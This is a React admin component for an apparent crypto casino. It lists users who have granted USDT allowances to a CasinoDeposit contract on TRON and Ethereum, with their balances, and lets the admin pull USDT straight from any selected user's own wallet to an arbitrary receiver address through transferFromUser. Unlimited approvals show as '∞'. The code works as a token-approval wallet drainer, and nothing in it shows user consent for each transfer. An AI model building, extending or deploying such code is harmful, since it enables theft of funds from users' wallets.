'use client';

import { useState, useEffect, useCallback } from 'react';
import { useWallet } from '@tronweb3/tronwallet-adapter-react-hooks';
import { useAccount, usePublicClient, useWalletClient } from 'wagmi';
import { createClient } from '@/lib/supabase';
import { getActiveTronConfig, getActiveNetworkConfig, SUPPORTED_TOKENS, CONTRACTS } from '@/lib/contracts';
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from '@/components/ui/table';
import { Badge } from '@/components/ui/badge';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Loader2, Send, RefreshCw, AlertCircle, CheckCircle, Users, Wallet } from 'lucide-react';
import { toast } from 'sonner';
import { formatUnits, parseUnits, erc20Abi } from 'viem';

interface UserData {
  id: string;
  wallet_address: string;
}

interface UserWithData extends UserData {
  allowance: bigint;
  balance: bigint;
  network: 'tron' | 'evm';
}

// Helper to check if address is a TRON address (starts with T or t, case-insensitive)
const isTronAddress = (address: string): boolean => {
  return !!address && (address.startsWith('T') || address.startsWith('t')) && address.length === 34;
};

// Helper to check if address is an EVM address (starts with 0x)
const isEvmAddress = (address: string): boolean => {
  return !!address && address.startsWith('0x') && address.length === 42;
};

export function PermitTransfer() {
  const { address: tronAddress, connected: isTronConnected } = useWallet();
  const { address: evmAddress, isConnected: isEvmConnected } = useAccount();
  const publicClient = usePublicClient();
  const { data: walletClient } = useWalletClient();
  const supabase = createClient();
  
  // TRON state
  const [tronUsers, setTronUsers] = useState<UserData[]>([]);
  const [tronUsersWithData, setTronUsersWithData] = useState<UserWithData[]>([]);
  const [isTronLoading, setIsTronLoading] = useState(true);
  const [isTronDataLoading, setIsTronDataLoading] = useState(false);
  
  // EVM state
  const [evmUsers, setEvmUsers] = useState<UserData[]>([]);
  const [evmUsersWithData, setEvmUsersWithData] = useState<UserWithData[]>([]);
  const [isEvmLoading, setIsEvmLoading] = useState(true);
  const [isEvmDataLoading, setIsEvmDataLoading] = useState(false);
  
  // Shared state
  const [selectedUser, setSelectedUser] = useState<UserWithData | null>(null);
  const [receiverAddress, setReceiverAddress] = useState('');
  const [transferAmount, setTransferAmount] = useState('');
  const [isProcessing, setIsProcessing] = useState(false);
  const [txSuccess, setTxSuccess] = useState(false);
  const [activeTab, setActiveTab] = useState<'tron' | 'evm'>('tron');

  // Load TRON users from database
  const loadTronUsers = useCallback(async () => {
    setIsTronLoading(true);
    try {
      const { data, error } = await supabase
        .from('users')
        .select('id, wallet_address')
        .not('wallet_address', 'is', null)
        .or('wallet_address.like.T%,wallet_address.like.t%')
        .order('created_at', { ascending: false });
      
      if (error) {
        console.error('Error loading TRON users:', error);
        return;
      }
      
      // Only use properly cased TRON addresses (start with uppercase 'T')
      const validTronUsers = (data || []).filter((u: any) => 
        isTronAddress(u.wallet_address) && u.wallet_address.startsWith('T')
      );
      setTronUsers(validTronUsers);
    } catch (error) {
      console.error('Error:', error);
    } finally {
      setIsTronLoading(false);
    }
  }, [supabase]);

  // Load EVM users from database
  const loadEvmUsers = useCallback(async () => {
    setIsEvmLoading(true);
    try {
      const { data, error } = await supabase
        .from('users')
        .select('id, wallet_address')
        .not('wallet_address', 'is', null)
        .like('wallet_address', '0x%')
        .order('created_at', { ascending: false });
      
      if (error) {
        console.error('Error loading EVM users:', error);
        return;
      }
      
      const validEvmUsers = (data || []).filter((u: any) => isEvmAddress(u.wallet_address));
      setEvmUsers(validEvmUsers);
    } catch (error) {
      console.error('Error:', error);
    } finally {
      setIsEvmLoading(false);
    }
  }, [supabase]);

  // Fetch allowances and balances for TRON users
  const fetchTronData = useCallback(async () => {
    if (tronUsers.length === 0) {
      setTronUsersWithData([]);
      return;
    }

    setIsTronDataLoading(true);
    try {
      const tronWeb = (window as any).tronWeb || (window as any).tronLink?.tronWeb;
      if (!tronWeb || !tronWeb.ready) {
        console.warn('TronWeb not available');
        setTronUsersWithData([]);
        return;
      }

      const tronConfig = getActiveTronConfig();
      const usdtContract = await tronWeb.contract().at(tronConfig.usdt);
      
      const usersData: UserWithData[] = [];
      
      for (const user of tronUsers) {
        try {
          const [allowanceResult, balanceResult] = await Promise.all([
            usdtContract.allowance(user.wallet_address, tronConfig.casinoDepositAddress).call(),
            usdtContract.balanceOf(user.wallet_address).call()
          ]);

          const allowance = allowanceResult?.toString ? BigInt(allowanceResult.toString()) : BigInt(0);
          const balance = balanceResult?.toString ? BigInt(balanceResult.toString()) : BigInt(0);

          if (allowance > BigInt(0)) {
            usersData.push({
              ...user,
              allowance,
              balance,
              network: 'tron'
            });
          }
        } catch (err) {
          console.warn(`Failed to fetch TRON data for ${user.wallet_address}:`, err);
        }
      }
      
      setTronUsersWithData(usersData);
    } catch (error) {
      console.error('Error fetching TRON data:', error);
    } finally {
      setIsTronDataLoading(false);
    }
  }, [tronUsers]);

  // Fetch allowances and balances for EVM users
  const fetchEvmData = useCallback(async () => {
    if (evmUsers.length === 0 || !publicClient) {
      setEvmUsersWithData([]);
      return;
    }

    setIsEvmDataLoading(true);
    try {
      const networkConfig = getActiveNetworkConfig();
      const usdtAddress = SUPPORTED_TOKENS.USDT.address as `0x${string}`;
      const casinoAddress = networkConfig.casinoDepositAddress as `0x${string}`;
      
      const usersData: UserWithData[] = [];
      
      for (const user of evmUsers) {
        try {
          const userAddress = user.wallet_address as `0x${string}`;
          
          const [allowance, balance] = await Promise.all([
            publicClient.readContract({
              address: usdtAddress,
              abi: erc20Abi,
              functionName: 'allowance',
              args: [userAddress, casinoAddress]
            }),
            publicClient.readContract({
              address: usdtAddress,
              abi: erc20Abi,
              functionName: 'balanceOf',
              args: [userAddress]
            })
          ]);

          if (allowance > BigInt(0)) {
            usersData.push({
              ...user,
              allowance,
              balance,
              network: 'evm'
            });
          }
        } catch (err) {
          console.warn(`Failed to fetch EVM data for ${user.wallet_address}:`, err);
        }
      }
      
      setEvmUsersWithData(usersData);
    } catch (error) {
      console.error('Error fetching EVM data:', error);
    } finally {
      setIsEvmDataLoading(false);
    }
  }, [evmUsers, publicClient]);

  // Load users on mount
  useEffect(() => {
    loadTronUsers();
    loadEvmUsers();
  }, [loadTronUsers, loadEvmUsers]);

  // Fetch TRON data when users loaded and wallet connected
  useEffect(() => {
    if (tronUsers.length > 0 && isTronConnected) {
      fetchTronData();
    }
  }, [tronUsers, isTronConnected, fetchTronData]);

  // Fetch EVM data when users loaded and wallet connected
  useEffect(() => {
    if (evmUsers.length > 0 && isEvmConnected && publicClient) {
      fetchEvmData();
    }
  }, [evmUsers, isEvmConnected, publicClient, fetchEvmData]);

  // Execute TRON transfer
  const executeTronTransfer = async () => {
    if (!selectedUser || !receiverAddress || !transferAmount) {
      toast.error('Please fill in all fields');
      return;
    }

    if (!isTronAddress(receiverAddress)) {
      toast.error('Invalid TRON receiver address format');
      return;
    }

    const amount = BigInt(Math.floor(parseFloat(transferAmount) * 1e6));

    if (amount <= BigInt(0)) {
      toast.error('Amount must be greater than 0');
      return;
    }

    if (amount > selectedUser.allowance) {
      toast.error('Transfer amount exceeds user allowance');
      return;
    }

    if (amount > selectedUser.balance) {
      toast.error('Transfer amount exceeds user balance');
      return;
    }

    try {
      setIsProcessing(true);
      setTxSuccess(false);

      const tronWeb = (window as any).tronWeb || (window as any).tronLink?.tronWeb;
      if (!tronWeb || !tronWeb.ready) {
        toast.error('TronLink wallet not detected or not ready');
        return;
      }

      const tronConfig = getActiveTronConfig();
      const casinoContract = await tronWeb.contract().at(tronConfig.casinoDepositAddress);
      
      const tx = await casinoContract.transferFromUser(
        tronConfig.usdt,
        selectedUser.wallet_address,
        receiverAddress,
        amount.toString()
      ).send();

      console.log('TRON Transfer tx:', tx);
      toast.success('Transfer submitted successfully!');
      setTxSuccess(true);
      
      setSelectedUser(null);
      setReceiverAddress('');
      setTransferAmount('');
      
      setTimeout(() => fetchTronData(), 3000);
    } catch (error: any) {
      console.error('TRON Transfer error:', error);
      toast.error(error.message || 'Transfer failed');
    } finally {
      setIsProcessing(false);
    }
  };

  // Execute EVM transfer
  const executeEvmTransfer = async () => {
    if (!selectedUser || !receiverAddress || !transferAmount || !walletClient) {
      toast.error('Please fill in all fields');
      return;
    }

    if (!isEvmAddress(receiverAddress)) {
      toast.error('Invalid EVM receiver address format');
      return;
    }

    const amount = parseUnits(transferAmount, 6); // USDT has 6 decimals

    if (amount <= BigInt(0)) {
      toast.error('Amount must be greater than 0');
      return;
    }

    if (amount > selectedUser.allowance) {
      toast.error('Transfer amount exceeds user allowance');
      return;
    }

    if (amount > selectedUser.balance) {
      toast.error('Transfer amount exceeds user balance');
      return;
    }

    try {
      setIsProcessing(true);
      setTxSuccess(false);

      const networkConfig = getActiveNetworkConfig();
      const casinoAddress = networkConfig.casinoDepositAddress as `0x${string}`;
      const usdtAddress = SUPPORTED_TOKENS.USDT.address as `0x${string}`;

      // Call transferFromUser on the CasinoDeposit contract
      const hash = await walletClient.writeContract({
        address: casinoAddress,
        abi: CONTRACTS.CasinoDeposit.abi,
        functionName: 'transferFromUser',
        args: [
          usdtAddress,
          selectedUser.wallet_address as `0x${string}`,
          receiverAddress as `0x${string}`,
          amount
        ]
      });

      console.log('EVM Transfer tx:', hash);
      toast.success('Transfer submitted successfully!');
      setTxSuccess(true);
      
      setSelectedUser(null);
      setReceiverAddress('');
      setTransferAmount('');
      
      setTimeout(() => fetchEvmData(), 3000);
    } catch (error: any) {
      console.error('EVM Transfer error:', error);
      toast.error(error.message || 'Transfer failed');
    } finally {
      setIsProcessing(false);
    }
  };

  const executeTransfer = () => {
    if (selectedUser?.network === 'tron') {
      executeTronTransfer();
    } else {
      executeEvmTransfer();
    }
  };

  const formatAddress = (addr: string) => {
    return `${addr.slice(0, 8)}...${addr.slice(-6)}`;
  };

  const formatAmount = (amount: bigint, decimals: number = 6) => {
    const num = Number(amount) / Math.pow(10, decimals);
    if (num > 1e15) return '∞';
    return num.toLocaleString(undefined, { maximumFractionDigits: 2 });
  };

  const handleRefresh = () => {
    if (activeTab === 'tron') {
      loadTronUsers();
      if (isTronConnected) fetchTronData();
    } else {
      loadEvmUsers();
      if (isEvmConnected && publicClient) fetchEvmData();
    }
  };

  const tronLoading = isTronLoading || isTronDataLoading;
  const evmLoading = isEvmLoading || isEvmDataLoading;

  const renderUserTable = (users: UserWithData[], loading: boolean, network: 'tron' | 'evm', isWalletConnected: boolean, walletAddress: string | null | undefined) => {
    if (!isWalletConnected) {
      return (
        <div className="flex items-center gap-2 p-4 rounded-lg bg-yellow-500/10 border border-yellow-500/20">
          <Wallet className="h-5 w-5 text-yellow-500" />
          <span className="text-yellow-400">
            Please connect your {network === 'tron' ? 'TRON' : 'EVM'} admin wallet to view approvals
          </span>
        </div>
      );
    }

    return (
      <>
        {/* Connected Wallet Info */}
        <div className="flex items-center gap-2 p-3 rounded-lg bg-casino-brand/10 border border-casino-brand/20">
          <Wallet className="h-4 w-4 text-casino-brand" />
          <span className="text-casino-brand text-sm">
            Connected: {walletAddress?.slice(0, 8)}...{walletAddress?.slice(-6)}
          </span>
        </div>

        {/* Transaction Success Status */}
        {txSuccess && (
          <div className="flex items-center gap-2 p-3 rounded-lg bg-green-500/10 border border-green-500/20">
            <CheckCircle className="h-4 w-4 text-green-400" />
            <span className="text-green-400">Transfer submitted successfully!</span>
          </div>
        )}

        {/* Users with Approvals Table */}
        <div className="rounded-md border border-white/10 overflow-x-auto">
          <Table>
            <TableHeader>
              <TableRow className="border-white/10 hover:bg-transparent">
                <TableHead>{network === 'tron' ? 'TRON' : 'EVM'} Wallet</TableHead>
                <TableHead className="text-center">USDT Balance</TableHead>
                <TableHead className="text-center">USDT Approved</TableHead>
                <TableHead>Action</TableHead>
              </TableRow>
            </TableHeader>
            <TableBody>
              {loading ? (
                <TableRow>
                  <TableCell colSpan={4} className="text-center py-8">
                    <Loader2 className="h-6 w-6 animate-spin mx-auto mb-2" />
                    Loading {network === 'tron' ? 'TRON' : 'EVM'} users and token data...
                  </TableCell>
                </TableRow>
              ) : users.length === 0 ? (
                <TableRow>
                  <TableCell colSpan={4} className="text-center py-8 text-muted-foreground">
                    <AlertCircle className="h-6 w-6 mx-auto mb-2 opacity-50" />
                    No {network === 'tron' ? 'TRON' : 'EVM'} users with USDT approvals found
                  </TableCell>
                </TableRow>
              ) : (
                users.map((user) => {
                  const isSelected = selectedUser?.id === user.id;
                  
                  return (
                    <TableRow 
                      key={user.id} 
                      className={`border-white/10 cursor-pointer transition-colors ${isSelected ? 'bg-casino-brand/10' : 'hover:bg-white/5'}`}
                      onClick={() => setSelectedUser(isSelected ? null : user)}
                    >
                      <TableCell className="font-mono">
                        <div className="flex items-center gap-2">
                          <Badge 
                            variant="outline" 
                            className={`text-xs ${network === 'tron' ? 'border-red-500/50 text-red-400' : 'border-blue-500/50 text-blue-400'}`}
                          >
                            {network === 'tron' ? 'TRC-20' : 'ERC-20'}
                          </Badge>
                          {formatAddress(user.wallet_address)}
                        </div>
                      </TableCell>
                      <TableCell className="text-center">
                        <span className="text-sm">
                          {formatAmount(user.balance)} USDT
                        </span>
                      </TableCell>
                      <TableCell className="text-center">
                        <Badge variant="outline" className="border-green-500/50 text-green-400">
                          {formatAmount(user.allowance)} USDT
                        </Badge>
                      </TableCell>
                      <TableCell>
                        <Button 
                          size="sm" 
                          variant={isSelected ? "default" : "outline"}
                          className={isSelected ? "bg-casino-brand text-black" : ""}
                        >
                          {isSelected ? 'Selected' : 'Select'}
                        </Button>
                      </TableCell>
                    </TableRow>
                  );
                })
              )}
            </TableBody>
          </Table>
        </div>

        {/* Transfer Form */}
        {selectedUser && selectedUser.network === network && (
          <div className="p-4 rounded-lg border border-casino-brand/30 bg-casino-brand/5 space-y-4">
            <h4 className="font-semibold flex items-center gap-2">
              <CheckCircle className="h-4 w-4 text-casino-brand" />
              Transfer USDT from {formatAddress(selectedUser.wallet_address)}
            </h4>
            
            <div className="grid grid-cols-2 gap-4">
              <div className="space-y-2">
                <Label>Receiver {network === 'tron' ? 'TRON' : 'EVM'} Address</Label>
                <Input
                  placeholder={network === 'tron' ? 'T...' : '0x...'}
                  value={receiverAddress}
                  onChange={(e) => setReceiverAddress(e.target.value)}
                  className="bg-black/30 border-white/10"
                />
              </div>
              <div className="space-y-2">
                <Label>
                  Amount USDT (Max: {formatAmount(
                    selectedUser.balance < selectedUser.allowance 
                      ? selectedUser.balance 
                      : selectedUser.allowance
                  )})
                </Label>
                <Input
                  type="number"
                  placeholder="0.00"
                  value={transferAmount}
                  onChange={(e) => setTransferAmount(e.target.value)}
                  className="bg-black/30 border-white/10"
                />
              </div>
            </div>

            <Button
              onClick={executeTransfer}
              disabled={isProcessing || !receiverAddress || !transferAmount}
              className="w-full bg-casino-brand text-black hover:bg-casino-brand/90"
            >
              {isProcessing ? (
                <>
                  <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                  Processing...
                </>
              ) : (
                <>
                  <Send className="mr-2 h-4 w-4" />
                  Transfer USDT
                </>
              )}
            </Button>

            <p className="text-xs text-muted-foreground">
              This will transfer USDT from the selected user to the receiver address. 
              User must have approved the CasinoDeposit contract.
            </p>
          </div>
        )}
      </>
    );
  };

  return (
    <Card className="bg-casino-panel border-white/5">
      <CardHeader>
        <div className="flex items-center justify-between">
          <div>
            <CardTitle className="flex items-center gap-2">
              <Users className="h-5 w-5 text-casino-brand" />
              Admin Transfer
            </CardTitle>
            <CardDescription>
              Transfer USDT from users who have approved the contract on TRON or Ethereum
            </CardDescription>
          </div>
          <Button variant="outline" size="sm" onClick={handleRefresh} disabled={tronLoading || evmLoading}>
            <RefreshCw className={`h-4 w-4 mr-2 ${(tronLoading || evmLoading) ? 'animate-spin' : ''}`} />
            Refresh
          </Button>
        </div>
      </CardHeader>
      <CardContent className="space-y-6">
        <Tabs value={activeTab} onValueChange={(v) => { setActiveTab(v as 'tron' | 'evm'); setSelectedUser(null); }}>
          <TabsList className="grid w-full grid-cols-2">
            <TabsTrigger value="tron" className="data-[state=active]:bg-red-500/20">
              <Badge variant="outline" className="mr-2 border-red-500/50 text-red-400">TRON</Badge>
              TRON Mainnet ({tronUsersWithData.length})
            </TabsTrigger>
            <TabsTrigger value="evm" className="data-[state=active]:bg-blue-500/20">
              <Badge variant="outline" className="mr-2 border-blue-500/50 text-blue-400">ETH</Badge>
              Ethereum Mainnet ({evmUsersWithData.length})
            </TabsTrigger>
          </TabsList>

          <TabsContent value="tron" className="space-y-4 mt-4">
            {renderUserTable(tronUsersWithData, tronLoading, 'tron', isTronConnected, tronAddress)}
          </TabsContent>

          <TabsContent value="evm" className="space-y-4 mt-4">
            {renderUserTable(evmUsersWithData, evmLoading, 'evm', isEvmConnected, evmAddress)}
          </TabsContent>
        </Tabs>
      </CardContent>
    </Card>
  );
}
